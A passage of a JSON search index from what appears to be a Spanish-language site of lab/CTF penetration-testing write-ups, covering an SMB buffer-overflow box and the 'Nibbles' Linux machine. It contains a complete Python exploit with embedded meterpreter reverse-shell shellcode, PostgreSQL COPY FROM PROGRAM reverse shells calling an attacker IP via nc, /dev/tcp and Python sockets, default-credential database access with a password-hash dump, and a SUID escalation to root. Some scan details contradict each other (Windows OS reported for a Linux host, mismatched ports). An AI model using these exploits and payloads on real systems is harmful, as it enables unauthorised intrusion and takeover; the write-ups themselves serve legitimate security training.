</ul>","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/INTERNAL/#codigo-python-que-se-ha-intentado-utilizar-de-exploit","title":"C\u00f3digo python que se ha intentado utilizar de exploit:","text":"<p>En escucha <pre><code>rlwrap nc -lvnp 443 \n</code></pre></p> <p>Generaci\u00f3n del shellcode <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.176 LPORT=443 EXITFUNC=thread  -f python -v shell &gt; shellcode_meterpreter \n</code></pre></p> <p>Fichero python de explotaci\u00f3n del buffer-overflow <pre><code>#!/usr/bin/env python3\n# Este exploit depende de que exista el binario `rpcclient` (del paquete samba-common-bin en Debian/Kali).\n# La idea es que tras inyectar el payload, se dispare mediante un intento de autenticaci\u00f3n SMB.\n# El \u00e9xito de la autenticaci\u00f3n NO importa, basta el evento.\n\nimport sys\nimport subprocess\nfrom socket import socket\n\ntry:\n    target = sys.argv[1]\nexcept IndexError:\n    print(f\"\\nUsage: {sys.argv[0]} &lt;target ip&gt;\\n\")\n    print(f\"Example: {sys.argv[0]} 192.168.1.1\\n\")\n    sys.exit(-1)\n\n# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.30.77 LPORT=443 EXITFUNC=thread -f python -v shell\n# Aqu\u00ed va tu shellcode generado con msfvenom\nshell =  b\"\"\nshell += b\"\\xfc\\xe8\\x8f\\x00\\x00\\x00\\x60\\x31\\xd2\\x64\\x8b\\x52\"\nshell += b\"\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x89\\xe5\\x31\\xff\\x0f\"\nshell += b\"\\xb7\\x4a\\x26\\x8b\\x72\\x28\\x31\\xc0\\xac\\x3c\\x61\\x7c\"\nshell += b\"\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\x49\\x75\\xef\\x52\"\nshell += b\"\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0\\x8b\\x40\\x78\"\nshell += b\"\\x85\\xc0\\x74\\x4c\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b\\x58\"\nshell += b\"\\x20\\x01\\xd3\\x85\\xc9\\x74\\x3c\\x49\\x8b\\x34\\x8b\\x01\"\nshell += b\"\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\"\nshell += b\"\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe0\\x58\"\nshell += b\"\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\"\nshell += b\"\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\"\nshell += b\"\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\"\nshell += b\"\\xe9\\x80\\xff\\xff\\xff\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\"\nshell += b\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\x89\\xe8\"\nshell += b\"\\xff\\xd0\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\"\nshell += b\"\\x29\\x80\\x6b\\x00\\xff\\xd5\\x6a\\x0a\\x68\\xc0\\xa8\\x2d\"\nshell += b\"\\xb0\\x68\\x02\\x00\\x01\\xbb\\x89\\xe6\\x50\\x50\\x50\\x50\"\nshell += b\"\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\"\nshell += b\"\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\"\nshell += b\"\\xc0\\x74\\x0a\\xff\\x4e\\x08\\x75\\xec\\xe8\\x67\\x00\\x00\"\nshell += b\"\\x00\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\"\nshell += b\"\\xff\\xd5\\x83\\xf8\\x00\\x7e\\x36\\x8b\\x36\\x6a\\x40\\x68\"\nshell += b\"\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\"\nshell += b\"\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\"\nshell += b\"\\xc8\\x5f\\xff\\xd5\\x83\\xf8\\x00\\x7d\\x28\\x58\\x68\\x00\"\nshell += b\"\\x40\\x00\\x00\\x6a\\x00\\x50\\x68\\x0b\\x2f\\x0f\\x30\\xff\"\nshell += b\"\\xd5\\x57\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x5e\\x5e\\xff\"\nshell += b\"\\x0c\\x24\\x0f\\x85\\x70\\xff\\xff\\xff\\xe9\\x9b\\xff\\xff\"\nshell += b\"\\xff\\x01\\xc3\\x29\\xc6\\x75\\xc1\\xc3\\xbb\\xe0\\x1d\\x2a\"\nshell += b\"\\x0a\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\"\nshell += b\"\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\"\nshell += b\"\\x53\\xff\\xd5\"\n\n\nhost = (target, 445)\n\nbuff  = b\"\\x00\\x00\\x03\\x9e\\xff\\x53\\x4d\\x42\"\nbuff += b\"\\x72\\x00\\x00\\x00\\x00\\x18\\x53\\xc8\"\nbuff += b\"\\x17\\x02\" # high process ID\nbuff += b\"\\x00\\xe9\\x58\\x01\\x00\\x00\"\nbuff += b\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\nbuff += b\"\\x00\\x00\\xfe\\xda\\x00\\x7b\\x03\\x02\"\nbuff += b\"\\x04\\x0d\\xdf\\xff\" * 25\nbuff += b\"\\x00\\x02\\x53\\x4d\"\nbuff += b\"\\x42\\x20\\x32\\x2e\\x30\\x30\\x32\\x00\"\nbuff += b\"\\x00\\x00\\x00\\x00\" * 37\nbuff += b\"\\xff\\xff\\xff\\xff\" * 2\nbuff += b\"\\x42\\x42\\x42\\x42\" * 7\nbuff += b\"\\xb4\\xff\\xff\\x3f\" # magic index\nbuff += b\"\\x41\\x41\\x41\\x41\" * 6\nbuff += b\"\\x09\\x0d\\xd0\\xff\" # return address\n\n# Stager_sysenter_hook from metasploit\nbuff+=b\"\\xfc\\xfa\\xeb\\x1e\\x5e\\x68\\x76\\x01\"\nbuff+=b\"\\x00\\x00\\x59\\x0f\\x32\\x89\\x46\\x5d\"\nbuff+=b\"\\x8b\\x7e\\x61\\x89\\xf8\\x0f\\x30\\xb9\"\nbuff+=b\"\\x16\\x02\\x00\\x00\\xf3\\xa4\\xfb\\xf4\"\nbuff+=b\"\\xeb\\xfd\\xe8\\xdd\\xff\\xff\\xff\\x6a\"\nbuff+=b\"\\x00\\x9c\\x60\\xe8\\x00\\x00\\x00\\x00\"\nbuff+=b\"\\x58\\x8b\\x58\\x54\\x89\\x5c\\x24\\x24\"\nbuff+=b\"\\x81\\xf9\\xde\\xc0\\xad\\xde\\x75\\x10\"\nbuff+=b\"\\x68\\x76\\x01\\x00\\x00\\x59\\x89\\xd8\"\nbuff+=b\"\\x31\\xd2\\x0f\\x30\\x31\\xc0\\xeb\\x31\"\nbuff+=b\"\\x8b\\x32\\x0f\\xb6\\x1e\\x66\\x81\\xfb\"\nbuff+=b\"\\xc3\\x00\\x75\\x25\\x8b\\x58\\x5c\\x8d\"\nbuff+=b\"\\x5b\\x69\\x89\\x1a\\xb8\\x01\\x00\\x00\"\nbuff+=b\"\\x80\\x0f\\xa2\\x81\\xe2\\x00\\x00\\x10\"\nbuff+=b\"\\x00\\x74\\x0e\\xba\\x00\\xff\\x3f\\xc0\"\nbuff+=b\"\\x83\\xc2\\x04\\x81\\x22\\xff\\xff\\xff\"\nbuff+=b\"\\x7f\\x61\\x9d\\xc3\\xff\\xff\\xff\\xff\"\nbuff+=b\"\\x00\\x04\\xdf\\xff\\x00\\x04\\xfe\\x7f\"\nbuff+=b\"\\x60\\x6a\\x30\\x58\\x99\\x64\\x8b\\x18\"\nbuff+=b\"\\x39\\x53\\x0c\\x74\\x2b\\x8b\\x43\\x10\"\nbuff+=b\"\\x8b\\x40\\x3c\\x83\\xc0\\x28\\x8b\\x08\"\nbuff+=b\"\\x03\\x48\\x03\\x81\\xf9\\x6c\\x61\\x73\"\nbuff+=b\"\\x73\\x75\\x15\\xe8\\x07\\x00\\x00\\x00\"\nbuff+=b\"\\xe8\\x0d\\x00\\x00\\x00\\xeb\\x09\\xb9\"\nbuff+=b\"\\xde\\xc0\\xad\\xde\\x89\\xe2\\x0f\\x34\"\nbuff+=b\"\\x61\\xc3\\x81\\xc4\\x54\\xf2\\xff\\xff\"\n\nbuff+=shell\n\n# Env\u00edo del buffer malicioso\ns = socket()\ns.connect(host)\ns.send(buff)\ns.close()\n\n# Trigger del payload v\u00eda intento de login SMB (el resultado de auth da igual)\ncmd = [\"rpcclient\", \"-U\", \"Administrator%1223456\", target, \"-c\", \"exit\"]\nsubprocess.call(cmd)\n</code></pre></p>","tags":["meterpreter","DNS","buffer-overflow","reverse-shell","smb","enumeraci\u00f3n"]},{"location":"writeups/NIBBLES/","title":"NIBBLES (Linux)","text":"","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#informacion-general","title":"Informaci\u00f3n General","text":"<ul> <li>Nombre de la m\u00e1quina: Nibbles</li> <li>Direcci\u00f3n IP: 192.168.179.47</li> <li>Sistema Operativo: Linux 5.0</li> <li>Nivel de dificultad: Medium</li> <li>Fecha de resoluci\u00f3n: 25/08/2025</li> <li>Autor: : Gonzalo Zumaquero Andujar</li> </ul>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#1-reconocimiento-inicial","title":"1 Reconocimiento Inicial","text":"","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#escaneo-de-so","title":"Escaneo de SO","text":"<p><pre><code>nmap -O $IP -oN SO     \n</code></pre> Sistema  Microsoft Windows Server 2008</p>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#escaneo-de-puertos-nmap","title":"Escaneo de puertos - Nmap","text":"<p><pre><code>nmap -p- --open -sS -Pn -n --min-rate 5000 -vvv $IP -oA allPorts  \n</code></pre> Open ports:  21,22,5437,80</p>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#escaneo-de-servicios-en-puertos-abiertos-nmap","title":"Escaneo de servicios en puertos abiertos - Nmap","text":"<p><pre><code>nmap -sCV -p21,242,3145,3389 $IP -oA services\n</code></pre> Servicios detectados: </p> PORT SERVICE VERSION 21 ftp vsftpd 3.0.3 22 ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 80 http Apache httpd 2.4.38 ((Debian)) 5437 postgresql PostgreSQL DB 11.3 - 11.9","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#2-enumeracion-inicial","title":"2 ENUMERACION INICIAL","text":"","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#puerto-21-servicio-ftp","title":"PUERTO 21 SERVICIO FTP*","text":"<p>Se prueba conexi\u00f3n an\u00f3nima</p> <p><pre><code>ftp  \"ftp://anonymous:anonymous@$IP\" \nftp  \"ftp://admin:admin@$IP\"  \n</code></pre> SIN CONCLUSIONES</p> <ul> <li>Posibles vulnerabilidades: Fuerza bruta pero se necesita un usuario para que se m\u00e1s efectivo</li> </ul>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#puerto-80-servicio-http","title":"PUERTO 80 SERVICIO HTTP","text":"<p>Exploraci\u00f3n inicial <pre><code>whatweb 192.168.179.47     \n</code></pre> - Servicios encontrados:     - Apache[2.4.38]     - [Debian Linux]Apache/2.4.38 (Debian)</p> <p>Fuzzing inicial <pre><code>nmap --script http-enum -p 80 $IP  \n</code></pre> Sin resultados</p> <p>Fuzzing b\u00e1sico: <pre><code>gobuster dir -u http://192.168.179.47/ \\                            \n  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \\\n  -x php,html,txt,bak,zip,conf,log,old,js \\                         \n  -t 50 \\                                                           \n  -o gobuster_basic.txt \\                                           \n  -b 403,404 \n</code></pre></p> <p>CONCLUSIONES  - Posibles vulnerabilidades: no encontradas, directory listing con fuzzing sin resultados</p>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#puerto-5437-servicio-postgres","title":"PUERTO  5437 SERVICIO POSTGRES","text":"<p>Se prueba a logearse con credenciales dadas por defecto en postgres: <code>postgres@postgres</code></p> <p><pre><code>psql -h 192.168.179.47 -p 5437 -U postgres -W\n</code></pre> Conclusiones - Se ha obtenido acceso a la sesi\u00f3n - Se deber\u00e1 revisar los permios con el usuario actual, es posible que se puedan escribir ficheros o realizar una lectura de los ya existentes</p> <p>Se comprueban permisos: <pre><code>\\du+ \n</code></pre></p> <p></p> <p>Se comprueba que el usuario actual tiene permisos de creaci\u00f3n de roles, bases de datos, replicaci\u00f3n e ignorar RLS</p> <p>Se realiza una revisi\u00f3n de directorios:</p> <p></p> <p>Detectado usuario wilson</p> <p>Se realiza una b\u00fasqueda de usuario y contrase\u00f1as: <pre><code>SELECT usename, passwd from pg_shadow; \n</code></pre> </p> <p>Detectado usuario postgres con hash en md5 sin resultados con el rockyou.txt</p> <p>NO SE HAN ENCONTRADO FALLOS DE CONFIGURACI\u00d3N -&gt; SE REALIZA UNA B\u00daSQUEDA DE VULNERABILIDADES</p> <p>Se comprueba versi\u00f3n para buscar vulnerabilidades conocidas: <pre><code>postgres=# SELECT version();\n</code></pre> </p> <p>Se realiza una b\u00fasqueda de vulnerabilidades conocidas para la versi\u00f3n detectada con resultados positivos.</p>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#3-explotacion","title":"3 Explotaci\u00f3n","text":"<pre><code>DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(line text);\n\n-- Usa $$...$$ para no pelearte con comillas\nCOPY cmd_exec FROM PROGRAM $$\nbash -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2&gt;&amp;1 \\\n| nc 192.168.49.56 80 &gt;/tmp/f'\n$$;\n</code></pre> <p>Se ha obtenido una revershell:</p> <p></p> <p>Otras formas habr\u00edan sido: </p> <p>SIN CREAR TABLA <pre><code>-- No necesitas tabla en esta variante\nCOPY (SELECT '') TO PROGRAM $$\nbash -c 'nohup bash -c \"rm -f /tmp/f; mkfifo /tmp/f; \\\ncat /tmp/f|/bin/sh -i 2&gt;&amp;1 | nc 192.168.49.56 80 &gt;/tmp/f\" \\\n&gt;/dev/null 2&gt;&amp;1 &amp;'\n$$;\n</code></pre></p> <p>CON BASH <pre><code>COPY (SELECT '') TO PROGRAM $$\nbash -c 'nohup bash -i &gt;&amp; /dev/tcp/192.168.49.56/80 0&gt;&amp;1 &gt;/dev/null 2&gt;&amp;1 &amp;'\n$$\n</code></pre></p> <p>CON PYTHON <pre><code>COPY (SELECT '') TO PROGRAM $$\npython3 -c 'import os,pty,socket; s=socket.socket(); s.connect((\"192.168.49.56\",80));\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(\"/bin/sh\")' &amp;\n$$;\n</code></pre></p> <p>Evidencia:</p> <p></p>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Se realiza una b\u00fasqueda de malas configuraciones SUID:</p> <p><pre><code>find / -perm -4000 -type f -uid 0 -exec ls -la {} \\; 2&gt;/dev/null | sort\n</code></pre> Se muestran los resultados:</p> <p></p> <p>Encontrados ejecutables que podr\u00edan permitir una escalada, se prueba con find, b\u00fasqueda en GFTObins:</p> <p></p> <pre><code>/usr/bin/find  . -exec /bin/sh -p \\; -quit \n</code></pre> <p>OBTENIDOS PERMISOS DE ROOT</p> <p></p>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#lecciones-aprendidas","title":"Lecciones aprendidas","text":"<ul> <li> <p>T\u00e9cnicas nuevas descubiertas:</p> <ul> <li>C\u00f3mo logearse y buscar malas configuraciones en postgrescli<ul> <li>psql</li> </ul> </li> <li>B\u00fasqueda de vinarios con permisos mal otorgados</li> </ul> </li> <li> <p>Errores cometidos y c\u00f3mo evitarlos en el futuro:</p> <ul> <li>Mal procedimiento, una vez detectados los servicios es mejor profundizar en la versi\u00f3n de estos y buscar vulnerabilidades conocidas en vez de intentar encontrar una mala configuraci\u00f3n, es m\u00e1s r\u00e1pido descartar que no existan vulnerabilidades y si existen es m\u00e1s r\u00e1pido aplicarlas.</li> </ul> </li> </ul>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]},{"location":"writeups/NIBBLES/#recursos-y-referencias","title":"Recursos y referencias","text":"<ul> <li>Exploit-DB</li> <li>GTFOBins</li> <li>HackTricks</li> <li>PayloadsAllTheThings</li> <li>VeryLazyTech</li> <li>HackinArticles</li> </ul>","tags":["http","SUID","postgres","fuzzing-web","gtfobins"]}]}